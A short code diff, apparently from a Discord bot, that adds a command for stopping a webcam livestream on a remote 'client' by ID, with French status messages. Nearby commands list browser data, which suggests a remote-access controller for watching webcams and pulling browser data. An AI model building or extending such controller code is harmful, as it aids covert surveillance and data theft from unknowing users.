@@ -123,6 +123,24 @@ export const handleLivestreamCommand = async (interaction) => {
     }
 }
 
+export const handleStopLivestreamCommand = async (interaction) => {
+    const clientId = interaction.options.getString('client_id');
+    await interaction.deferReply({ephemeral: true});
+
+    const url = `${API_BASE_URL}/webcam/stop/${clientId}`;
+    try {
+        await executeRequestWithTokenRefresh(url, {method: 'GET'});
+        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} arrêtée.`);
+    } catch (error) {
+        if (error.response.data.message.includes("hors ligne")) {
+            await interaction.editReply("Le client est hors ligne.");
+        } else {
+            console.error("Erreur lors de l'arrêt de la diffusion en direct : ", error.response.data.message);
+            await interaction.editReply(error.response.data.message);
+        }
+    }
+}
+
 export const handleListDataCommand = async (interaction) => {
     const type = interaction.options.getString('type');
     const browser = interaction.options.getString('browser') || null;
